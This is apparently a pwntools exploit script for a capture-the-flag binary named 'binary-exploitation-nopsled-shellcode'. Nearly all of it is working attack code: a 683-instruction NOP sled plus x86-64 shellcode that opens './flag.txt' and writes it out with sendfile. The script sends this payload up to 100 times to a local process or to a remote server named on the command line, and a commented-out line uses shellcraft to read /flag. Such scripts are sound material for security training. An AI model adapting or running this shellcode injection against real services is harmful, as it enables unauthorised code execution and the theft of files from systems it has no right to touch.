from pwn import *
from grwnapy.pwn import find_offset


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './challenge/binary-exploitation-nopsled-shellcode'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")
nop_sled = "nop\n" * 683
shellcode_asm = """
mov rax, 2
lea rdi, [rip+flag]
mov rsi, 0
syscall

mov rdi, 1
mov rsi, rax
mov r10, 1000
mov rdx, 0
mov rax, 40
syscall
flag:
.string "./flag.txt"
"""
# print(disasm(asm(nop_sled)))
# Convert assembly to machine code using pwntools
payload = asm(nop_sled + shellcode_asm)

for i in range(100):
    io = start()

    # Build the payload - assembly code
    # payload = asm(shellcraft.amd64.linux.cat("/flag"))
    # Send the payload (raw bytes)
    io.sendline(payload)
    # Got Shell?
    res = io.recvall()
    if b"pwn" in res:
        break
    # io.interactive()